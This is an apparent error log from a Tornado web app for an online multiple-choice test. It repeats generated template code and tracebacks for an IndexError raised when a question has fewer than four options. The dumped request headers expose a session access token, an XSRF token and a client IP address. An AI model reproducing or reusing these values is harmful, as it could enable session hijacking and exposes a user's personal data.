 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=50579d1d8e4c85782ae2b6d9&answers=%5B3%5D&cursor=4&_xsrf=bfa32809b9434dc5b19e6536f9c32ee6', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.56 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '188.220.245.181', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347918435.1; __utmb=188782963.5.10.1347918435; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 87.96ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=50579d1d8e4c85782ae2b6d9&answers=%5B3%5D&cursor=14&_xsrf=bfa32809b9434dc5b19e6536f9c32ee6', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.56 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '188.220.245.181', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347918435.1; __utmb=188782963.5.10.1347918435; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 100.32ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
